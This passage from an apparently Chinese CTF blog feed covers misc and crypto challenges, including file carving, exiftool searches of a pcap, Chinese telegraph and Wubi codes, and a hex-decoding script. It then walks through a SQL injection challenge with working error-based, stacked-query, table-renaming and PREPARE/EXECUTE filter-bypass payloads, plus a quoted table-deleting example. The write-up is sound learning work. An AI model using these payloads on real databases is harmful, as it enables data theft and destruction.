src="https://img-blog.csdnimg.cn/20200625205133701.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>然后解压得出一个word文档，打不开，010editor看出是zip压缩包。改后缀。<br>解压得到一堆文件，根据经验，信息一定藏在document里，果然找到了音符<br><img src="https://img-blog.csdnimg.cn/20200625205712288.png" alt="m0re" loading="lazy"><br>然后使用在线网站解码就行了<br><img src="https://img-blog.csdnimg.cn/20200625205737665.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="百里挑一"><a href="#百里挑一" class="headerlink" title="百里挑一"></a>百里挑一</h2><p>解压文件得到的是pcap数据包，题目提示好多图片，wireshark打开导出http对象，保存到一个文件夹中。然后在kali中使用一条命令找到一半的flag</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">exiftool <span class="token operator">*</span><span class="token punctuation">|</span>grep flag</code></pre><p>意思是在当前文件夹中匹配flag字段<br>关于exiftool看这里🔑<a href="https://www.jianshu.com/p/d76457799de1">exiftool的说明使用</a><br><img src="https://img-blog.csdnimg.cn/20200625211836264.png" alt="m0re" loading="lazy"><br>另一半需要在wireshark中找<br>但是我找了半天也没找到，烦躁💣<br>看了wp发现是114……郁闷💔<br><img src="https://img-blog.csdnimg.cn/20200625212803920.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>这……我真是🈚🐔8🐟</p><pre class="language-shell" data-language="shell"><code class="language-shell">flag<span class="token punctuation">&#123;</span>ae58d0408e26e8f26a3c0589d23edeec<span class="token punctuation">&#125;</span></code></pre><h2 id="从娃娃抓起"><a href="#从娃娃抓起" class="headerlink" title="从娃娃抓起"></a>从娃娃抓起</h2><p>两种编码，<br><img src="https://img-blog.csdnimg.cn/20200625213839895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>查询后了解到分别是中文电码和五笔编码<br><img src="https://img-blog.csdnimg.cn/20200625213808112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>第一行——<code>人工智能</code><br><img src="https://img-blog.csdnimg.cn/20200625214436482.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>第二行——<code>也要从娃娃抓起</code><br><img src="https://img-blog.csdnimg.cn/20200625214621648.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>32位小写</p><h2 id="DDCTF2018-╯°□°）╯︵-┻━┻"><a href="#DDCTF2018-╯°□°）╯︵-┻━┻" class="headerlink" title="[DDCTF2018](╯°□°）╯︵ ┻━┻"></a>[DDCTF2018](╯°□°）╯︵ ┻━┻</h2><p>打开文件发现一串字符串。<br><img src="https://img-blog.csdnimg.cn/20200625215047983.png" alt="m0re" loading="lazy"><br>十六进制的数字，先转换成10进制的。需要先将这么多数字中两个两个分开。<br>脚本：</p><pre class="language-python" data-language="python"><code class="language-python">s<span class="token operator">=</span><span class="token string">"d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd"</span>a <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> a<span class="token operator">+</span><span class="token string">"0x"</span>    a <span class="token operator">+=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span>    a <span class="token operator">+=</span> <span class="token string">","</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></code></pre><pre class="language-bash" data-language="bash"><code class="language-bash">0xd4,0xe8,0xe1,0xf4,0xa0,0xf7,0xe1,0xf3,0xa0,0xe6,0xe1,0xf3,0xf4,0xa1,0xa0,0xd4,0xe8,0xe5,0xa0,0xe6,0xec,0xe1,0xe7,0xa0,0xe9,0xf3,0xba,0xa0,0xc4,0xc4,0xc3,0xd4,0xc6,0xfb,0xb9,0xb2,0xb2,0xe1,0xe2,0xb9,0xb9,0xb7,0xb4,0xe1,0xb4,0xb7,0xe3,0xe4,0xb3,0xb2,0xb2,0xe3,0xe6,0xb4,0xb3,0xe2,0xb5,0xb0,0xb6,0xb1,0xb0,0xe6,0xe1,0xe5,0xe1,0xb5,0xfd,</code></pre><p>然后转换成ascii码， 但是转换成10进制时，发现数值都大于128，所以减去128进行尝试，<code>(128=0x80)</code></p><pre class="language-python" data-language="python"><code class="language-python">a<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0xd4</span><span class="token punctuation">,</span><span class="token number">0xe8</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0xf4</span><span class="token punctuation">,</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token number">0xf7</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0xf3</span><span class="token punctuation">,</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token number">0xe6</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0xf3</span><span class="token punctuation">,</span><span class="token number">0xf4</span><span class="token punctuation">,</span><span class="token number">0xa1</span><span class="token punctuation">,</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token number">0xd4</span><span class="token punctuation">,</span><span class="token number">0xe8</span><span class="token punctuation">,</span><span class="token number">0xe5</span><span class="token punctuation">,</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token number">0xe6</span><span class="token punctuation">,</span><span class="token number">0xec</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0xe7</span><span class="token punctuation">,</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token number">0xe9</span><span class="token punctuation">,</span><span class="token number">0xf3</span><span class="token punctuation">,</span><span class="token number">0xba</span><span class="token punctuation">,</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token number">0xc4</span><span class="token punctuation">,</span><span class="token number">0xc4</span><span class="token punctuation">,</span><span class="token number">0xc3</span><span class="token punctuation">,</span><span class="token number">0xd4</span><span class="token punctuation">,</span><span class="token number">0xc6</span><span class="token punctuation">,</span><span class="token number">0xfb</span><span class="token punctuation">,</span><span class="token number">0xb9</span><span class="token punctuation">,</span><span class="token number">0xb2</span><span class="token punctuation">,</span><span class="token number">0xb2</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0xe2</span><span class="token punctuation">,</span><span class="token number">0xb9</span><span class="token punctuation">,</span><span class="token number">0xb9</span><span class="token punctuation">,</span><span class="token number">0xb7</span><span class="token punctuation">,</span><span class="token number">0xb4</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0xb4</span><span class="token punctuation">,</span><span class="token number">0xb7</span><span class="token punctuation">,</span><span class="token number">0xe3</span><span class="token punctuation">,</span><span class="token number">0xe4</span><span class="token punctuation">,</span><span class="token number">0xb3</span><span class="token punctuation">,</span><span class="token number">0xb2</span><span class="token punctuation">,</span><span class="token number">0xb2</span><span class="token punctuation">,</span><span class="token number">0xe3</span><span class="token punctuation">,</span><span class="token number">0xe6</span><span class="token punctuation">,</span><span class="token number">0xb4</span><span class="token punctuation">,</span><span class="token number">0xb3</span><span class="token punctuation">,</span><span class="token number">0xe2</span><span class="token punctuation">,</span><span class="token number">0xb5</span><span class="token punctuation">,</span><span class="token number">0xb0</span><span class="token punctuation">,</span><span class="token number">0xb6</span><span class="token punctuation">,</span><span class="token number">0xb1</span><span class="token punctuation">,</span><span class="token number">0xb0</span><span class="token punctuation">,</span><span class="token number">0xe6</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0xe5</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0xb5</span><span class="token punctuation">,</span><span class="token number">0xfd</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> a<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200625215914254.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>得到flag<br>还找到一个一步走的脚本</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">hex_str</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    hex_str_list<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        hex_str<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span>        hex_str_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>hex_str<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hex列表：%s\n"</span><span class="token operator">%</span>hex_str_list<span class="token punctuation">)</span>    hex_to_str<span class="token punctuation">(</span>hex_str_list<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hex_to_str</span><span class="token punctuation">(</span>hex_str_list<span class="token punctuation">)</span><span class="token punctuation">:</span>    int_list<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    dec_list<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    flag<span class="token operator">=</span><span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>hex_str_list<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        int_str<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'0x%s'</span><span class="token operator">%</span>hex_str_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>        int_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>int_str<span class="token punctuation">)</span>        dec_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>int_str<span class="token operator">-</span><span class="token number">128</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>dec_list<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>dec_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"转化为十进制int列表：%s\n"</span><span class="token operator">%</span>int_list<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-128得到ASCII十进制dec列表：%s\n"</span><span class="token operator">%</span>dec_list<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'最终答案：%s'</span><span class="token operator">%</span>flag<span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token builtin">str</span><span class="token operator">=</span><span class="token string">'d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd'</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"字符串长度：%s"</span><span class="token operator">%</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    hex_str<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span></code></pre><h1 id="总结🍗"><a href="#总结🍗" class="headerlink" title="总结🍗"></a>总结🍗</h1><p>密码学了解🍕<br>标准银河字母🔑——<a href="https://image.baidu.com/search/detail?ct=503316480&z=0&ipn=d&word=%E6%A0%87%E5%87%86%E9%93%B6%E6%B2%B3%E5%AD%97%E6%AF%8D&step_word=&hs=2&pn=0&spn=0&di=6490&pi=0&rn=1&tn=baiduimagedetail&is=0,0&istype=0&ie=utf-8&oe=utf-8&in=&cl=2&lm=-1&st=undefined&cs=45684456,4016032718&os=1987249333,3716423177&simid=4256684839,917346164&adpicid=0&lpn=0&ln=1482&fr=&fmq=1593097809502_R&fm=&ic=undefined&s=undefined&hd=undefined&latest=undefined&copyright=undefined&se=&sme=&tab=0&width=undefined&height=undefined&face=undefined&ist=&jit=&cg=&bdtype=0&oriquery=&objurl=http://s10.sinaimg.cn/mw690/001ldFUyzy6Yr8To5LP19&690&fromurl=ippr_z2C$qAzdH3FAzdH3Fks52_z&e3Bftgw_z&e3Bv54_z&e3BvgAzdH3FfAzdH3Fks52_9l9kwl8ja8adoj8y_z&e3Bip4s&gsm=1&rpstart=0&rpnum=0&islist=&querylist=&force=undefined">对照表</a><br>键盘密码<br>当铺密码<br>变异凯撒</p><p>杂项了解🎂<br>JS美化<br>解密电话音<br>工具——dtmf2num.exe<br>工具——FreeFileCamouflage<br>词频分析<br>    - 脚本<br>    - 在线网站<br>新了解的编码——EBCDIC（可用010editor转码）<br>跳舞的小人<br>base64隐写<br>敲击码<br>套娃解压压缩包——脚本<br>音符加密<br>工具——exiftool<br>中文电码<br>五笔编码</p><p>抓住端午节的小尾巴，端午节快乐！<br>以上就是这次总结，再接再厉。加油！加个鸡腿🍗</p><p>文末寄语</p><blockquote><p>欢迎来到现实世界，它糟糕得要命，但你会爱上它的。——《老友记》</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> CTF题记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF题记————暑假计划第一周</title>
      <link href="/posts/dd07c3b4/"/>
      <url>/posts/dd07c3b4/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学期结束，暑假开始，博客也开始正常更新。<br>差不多就是一周一篇CTF题记，一篇漏洞原理的知识，外加随便一篇。</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p>Web类的题目是在BUUCTF挑选的。</p><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>查看源码，看到<code>sqlmap是没有灵魂的</code>应该不能使用sqlmap，先尝试其他的办法。<br>直接提交1<br><img src="https://img-blog.csdnimg.cn/20200706102805631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后判断闭合，输入单引号报错，可以判断是字符型SQL注入。<br><code>1&#39; order by 3#</code><br>判断列数，到3已经报错了，说明只有2列。<br>然后先试试联合查询注入<br><img src="https://img-blog.csdnimg.cn/20200706103911187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>正则匹配过滤URL中的<code>select、upload、where还有&quot;.&quot;</code>等，尝试大小写绕过，失败。<br>所以尝试下报错注入，payload</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#</span></code></pre><p>这个跟我常用的不一样，我以前常用的报错注入payload里面是包含了<code>select</code>的，所以有找了一个没有过滤内容的payload来进行绕过。<br><img src="https://img-blog.csdnimg.cn/20200706105430899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>数据库名是<code>supersqli</code><br>然后就卡住了，查看前面师傅们的wp，了解到了堆叠注入。<br>先了解一下……</p><blockquote><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p></blockquote><p>当然堆叠注入还有一定的局限性，这个以后遇到再进行学习。<br>payload</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">0</span>'<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">databases</span><span class="token punctuation">;</span><span class="token comment">#</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200706110556458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>爆出来六个数据库名。<br>然后查看所有的表</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">0</span>'<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">tables</span><span class="token punctuation">;</span><span class="token comment">#</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200706113550500.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>查看表中字段</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">0</span>'<span class="token punctuation">;</span><span class="token keyword">desc</span> words<span class="token punctuation">;</span><span class="token comment">#</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200706123157128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>好像是没有什么有效信息，再看另一个</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">0</span>'<span class="token punctuation">;</span><span class="token keyword">desc</span> <span class="token punctuation">`</span><span class="token number">1919810931114514</span><span class="token punctuation">`</span><span class="token punctuation">;</span><span class="token comment">#</span><span class="token comment">#注释字段名是数字，查看时用  `  包起来</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200706123319479.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这个查询flag的方式才是需要解决的。<br>然后看了一个师傅的wp是这么写的，正则过滤没有过滤alert和rename这两个，所以可以使用这两个功能来实现一波骚操作</p><blockquote><p>1.将words表改名为word1或其它任意名字<br>2.1919810931114514改名为words<br>3.将新的word表插入一列，列名为id<br>4.将flag列改名为data</p></blockquote><p>有两个payload，我都进行尝试但是结果没有出flag。先贴一下payload</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#第一个</span>?inject<span class="token operator">=</span><span class="token number">1</span>’<span class="token punctuation">;</span> <span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> <span class="token punctuation">`</span>words<span class="token punctuation">`</span> CHANGE <span class="token punctuation">`</span>flag<span class="token punctuation">`</span> <span class="token punctuation">`</span><span class="token keyword">data</span><span class="token punctuation">`</span> <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token keyword">CHARACTER</span> <span class="token keyword">SET</span> utf8 <span class="token keyword">COLLATE</span> utf8_general_ci <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">columns</span> <span class="token keyword">from</span> words<span class="token punctuation">;</span><span class="token comment">#</span><span class="token comment">#第二个</span>?inject<span class="token operator">=</span><span class="token number">1</span>’<span class="token punctuation">;</span><span class="token keyword">rename</span> <span class="token keyword">table</span> <span class="token punctuation">`</span>words<span class="token punctuation">`</span> <span class="token keyword">to</span><span class="token punctuation">`</span> word1<span class="token punctuation">`</span><span class="token punctuation">;</span><span class="token keyword">rename</span> <span class="token keyword">table</span> <span class="token punctuation">`</span><span class="token number">1919810931114514</span><span class="token punctuation">`</span> <span class="token keyword">to</span> <span class="token punctuation">`</span>words<span class="token punctuation">`</span><span class="token punctuation">;</span><span class="token keyword">alter</span> <span class="token keyword">table</span> <span class="token punctuation">`</span>words<span class="token punctuation">`</span> <span class="token keyword">add</span> id <span class="token keyword">int</span> <span class="token keyword">unsigned</span> <span class="token operator">not</span> <span class="token boolean">Null</span> <span class="token keyword">auto_increment</span> <span class="token keyword">primary</span> <span class="token keyword">key</span><span class="token punctuation">;</span> alert <span class="token keyword">table</span> <span class="token punctuation">`</span>words<span class="token punctuation">`</span> change <span class="token punctuation">`</span>flag<span class="token punctuation">`</span> <span class="token punctuation">`</span><span class="token keyword">data</span><span class="token punctuation">`</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span></code></pre><p>结果一样，<br><img src="https://img-blog.csdnimg.cn/20200706124907396.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>emmm，我又查看了一遍，发现没修改成功，<br><img src="https://img-blog.csdnimg.cn/20200706125420726.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>不知道是什么原因，emmm不慌，还有一种方法：<br>PHP中mysql预处理，，不知道，先学习一下<br>参考博客——🔑<a href="https://www.cnblogs.com/geaozhang/p/9891338.html">MySQL的SQL预处理(Prepared)</a><br>语法：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token shell-comment comment"># 定义预处理语句</span><span class="token constant">PREPARE</span> stmt_name <span class="token constant">FROM</span> preparable_stmt<span class="token punctuation">;</span><span class="token shell-comment comment"># 执行预处理语句</span><span class="token constant">EXECUTE</span> stmt_name <span class="token punctuation">[</span><span class="token constant">USING</span> @var_name <span class="token punctuation">[</span><span class="token punctuation">,</span> @var_name<span class="token punctuation">]</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 删除(释放)定义</span><span class="token punctuation">&#123;</span><span class="token constant">DEALLOCATE</span> <span class="token operator">|</span> <span class="token constant">DROP</span><span class="token punctuation">&#125;</span> <span class="token constant">PREPARE</span> stmt_name<span class="token punctuation">;</span></code></pre><p>在mysql命令行中看下<br><img src="https://img-blog.csdnimg.cn/20200706134836577.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>真是tql<br><img src="https://img-blog.csdnimg.cn/20200706135040625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后就可以做题了。下面的payload可以用。</p><pre class="language-sql" data-language="sql"><code class="language-sql">?inject<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">SeT</span><span class="token variable">@a</span><span class="token operator">=</span><span class="token number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span><span class="token punctuation">;</span><span class="token keyword">prepare</span> execsql <span class="token keyword">from</span> <span class="token variable">@a</span><span class="token punctuation">;</span><span class="token keyword">execute</span> execsql<span class="token punctuation">;</span><span class="token comment">#</span></code></pre><p>这个是拼接的十六进制数字，将那一串数字转换为16进制。<br>还有一种方法可以将其转换为ascii码然后在进行转换</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">SET</span> <span class="token variable">@sql</span><span class="token operator">=</span>concat<span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">" * from `1919810931114514`"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">PREPARE</span> sqla <span class="token keyword">from</span> <span class="token variable">@sql</span><span class="token punctuation">;</span><span class="token keyword">EXECUTE</span> sqla<span class="token punctuation">;</span><span class="token comment">#</span></code></pre><p>喔，666<br><img src="https://img-blog.csdnimg.cn/20200706125938499.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>膜拜大佬，这方法也太强了。</p><h2 id="技能树HTTP协议基础认证"><a href="#技能树HTTP协议基础认证" class="headerlink" title="技能树HTTP协议基础认证"></a>技能树HTTP协议基础认证</h2><p><img src="https://img-blog.csdnimg.cn/20200525223546242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="j4y" loading="lazy"><br>浏览过一遍网页后，开启代理。点击click进行抓包。<br><img src="https://img-blog.csdnimg.cn/20200525223644319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="j4y" loading="lazy"><br>用户输入admin 密码随机123<br><img 